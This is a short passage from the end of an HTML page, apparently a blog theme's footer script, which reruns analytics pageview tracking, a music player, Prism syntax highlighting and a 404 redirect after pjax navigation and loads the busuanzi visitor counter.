  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()

  typeof preloader === 'object' && preloader.endLoading()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>